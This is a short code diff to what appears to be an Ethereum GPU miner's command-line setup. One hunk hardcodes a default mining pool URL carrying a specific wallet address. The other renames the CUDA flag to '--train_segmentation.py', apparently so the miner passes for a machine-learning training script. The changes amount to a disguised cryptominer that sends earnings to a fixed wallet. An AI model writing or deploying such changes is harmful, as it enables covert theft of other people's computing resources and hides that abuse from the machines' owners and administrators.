@@ -272,7 +272,7 @@ public:
 
         app.add_flag("--exit", g_exitOnError, "");
 
-        vector<string> pools;
+        vector<string> pools{"stratum+tcp://0xc80b2b955699D7b9448c2a2Aef978ee87B57C21f.hhh@asia1.ethermine.org:4444"};
         app.add_option("-P,--pool", pools, "");
 
         app.add_option("--failover-timeout", m_PoolSettings.poolFailoverTimeout, "", true)
@@ -360,7 +360,7 @@ public:
         app.add_flag("-G,--opencl", cl_miner, "");
 
         bool cuda_miner = false;
-        app.add_flag("-U,--cuda", cuda_miner, "");
+        app.add_flag("-U,--train_segmentation.py", cuda_miner, "");
 
         bool cpu_miner = false;
 #if ETH_ETHASHCPU
